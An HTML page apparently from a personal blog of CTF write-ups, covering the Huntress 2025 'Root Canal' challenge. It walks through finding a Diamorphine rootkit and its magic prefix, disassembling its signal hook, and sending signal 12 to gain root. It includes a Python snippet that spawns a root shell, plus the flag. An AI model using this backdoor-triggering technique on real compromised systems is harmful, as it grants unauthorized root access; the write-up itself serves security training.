@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>2025-10-31 · Will Seligman</title>
+<link rel="stylesheet" href="/assets/style.css">
+</head>
+<body>
+<button id="menu-toggle" aria-label="Toggle navigation">&#9776; Menu</button>
+<div class="layout">
+<aside class="sidebar" id="sidebar">
+  <a class="brand" href="/index.html">
+    <span class="brand-flag">&#127988;</span>
+    <span class="brand-text"><strong>Will Seligman</strong><small>Cybersecurity Notes & CTF Writeups</small></span>
+  </a>
+  <nav class="nav" id="nav-root" data-current="huntress/2025/2025-10-31.html"></nav>
+</aside>
+<main class="content">
+  <article class="doc">
+  <div class="breadcrumb"><a href="/huntress/index.html">Huntress CTF</a> &rsaquo; <a href="/huntress/2025/index.html">2025</a></div>
+  <h1 id="2025-10-31">2025-10-31</h1>
+<h1 id="root-canal"><strong>📦 Root Canal</strong></h1>
+<p><span class="img-missing">image unavailable</span></p>
+<p>```plain text<br />
+Initial Reconnaissance</p>
+<p>Found README.txt with hint: "fix your root canal" → wordplay on "root"<br />
+Searched for SUID binaries (standard system binaries, nothing unusual)<br />
+Discovered /opt/.diamorphine/ directory containing rootkit files</p>
+<p>Rootkit Analysis</p>
+<p>Identified Diamorphine rootkit was loaded (hidden from lsmod)<br />
+Used strings on the kernel module to find magic prefix: "squiblydoo"<br />
+Discovered the rootkit hides files/directories starting with "squiblydoo"</p>
+<p>Finding the Hidden Directory</p>
+<p>Attempted to create ~/squiblydoo → got "File exists" error<br />
+Confirmed directory existed but was hidden by the rootkit<br />
+Directory had 0000 permissions and was owned by root (inaccessible without root)</p>
+<p>Privilege Escalation</p>
+<p>Analyzed the rootkit binary with objdump and nm<br />
+Found give_root and hacked_kill functions<br />
+Disassembled hacked_kill to find signal numbers: 11, 12, 13 (not 63/64 as initially tried)<br />
+Signal 12 (SIGUSR2) triggers the give_root function</p>
+<p>Exploitation</p>
+<p>Sent signal 12 to own process: os.kill(os.getpid(), 12) or kill -12 $$<br />
+Successfully escalated to root (UID 0)<br />
+Accessed hidden directory: ~/squiblydoo/<br />
+Retrieved flag: flag{ce56efc41f0c7b45a7e32ec7117cf8b9}</p>
+<pre><code>
+```plain text
+Found diamorphine
+</code></pre>
+<p><span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span></p>
+<p>```plain text<br />
+found /home/ctf/squiblydoo exists and 0000 perms</p>
+<pre><code>&lt;span class=&quot;img-missing&quot;&gt;image unavailable&lt;/span&gt;
+&lt;span class=&quot;img-missing&quot;&gt;image unavailable&lt;/span&gt;
+
+```plain text
+module is loaded
+</code></pre>
+<p><span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span></p>
+<p>```plain text<br />
+cmp $0xc,%eax (line 4bd) - checks if signal is 12 (0xc in hex)<br />
+cmp $0xd,%eax (line 4c6) - checks if signal is 13 (0xd in hex)<br />
+cmp $0xb,%eax (line 4cb) - checks if signal is 11 (0xb in hex)</p>
+<p>So the rootkit is looking for signals 11, 12, or 13</p>
+<pre><code>&lt;span class=&quot;img-missing&quot;&gt;image unavailable&lt;/span&gt;
+
+```plain text
+ctf@ip-10-1-12-129:~$ python3 &lt;&lt; 'EOF'
+&gt; import os
+&gt; import signal
+&gt;
+&gt; # Send signal 12 to ourselves
+&gt; os.kill(os.getpid(), 12)
+&gt; print(f&quot;UID after signal 12: {os.getuid()}&quot;)
+&gt;
+&gt; if os.getuid() == 0:
+&gt;     print(&quot;[+] Got root!&quot;)
+&gt;     os.setuid(0)
+&gt;     os.setgid(0)
+&gt;     os.execv(&quot;/bin/bash&quot;, [&quot;/bin/bash&quot;])
+&gt; else:
+&gt;     print(&quot;[-] Still not root&quot;)
+&gt; EOF
+UID after signal 12: 0
+[+] Got root!
+ctf@ip-10-1-12-129:~$ ls -la ~/squiblydoo
+ls: cannot open directory '/home/ctf/squiblydoo': Permission denied
+ctf@ip-10-1-12-129:~$ kill -12 $$
+ctf@ip-10-1-12-129:~$ ls -la ~/squiblydoo
+total 12
+d--------- 2 root root 4096 Sep 26 14:12 .
+drwxr-xr-x 9 ctf  ctf  4096 Oct 31 13:32 ..
+---------- 1 root root   39 Sep 26 14:12 flag.txt
+ctf@ip-10-1-12-129:~$ cat ~/squiblydoo/flag.txt
+flag{ce56efc41f0c7b45a7e32ec7117cf8b9}
+</code></pre>
+<p><span class="img-missing">image unavailable</span><br />
+```plain text<br />
+flag{ce56efc41f0c7b45a7e32ec7117cf8b9}</p>
+<p>```</p>
+  </article>
+  <footer class="foot">Notes by Will Seligman · built from Notion</footer>
+</main>
+</div>
+<script src="/assets/nav.js" defer></script>
+<script>
+document.getElementById('menu-toggle').addEventListener('click',function(){
+  document.getElementById('sidebar').classList.toggle('open');
+});
+</script>
+</body>
+</html>
